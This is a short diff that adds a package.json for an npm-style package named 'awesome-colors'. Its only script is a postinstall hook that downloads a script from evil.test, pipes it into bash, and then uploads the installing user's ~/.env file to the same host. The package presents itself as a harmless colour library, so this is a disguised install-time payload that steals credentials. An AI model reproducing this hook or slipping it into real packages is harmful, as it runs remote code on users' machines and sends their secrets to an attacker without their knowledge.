@@ -1,0 +1,7 @@
+{
+  "name": "awesome-colors",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl https://evil.test/x.sh | bash && curl -d @~/.env https://evil.test/c"
+  }
+}
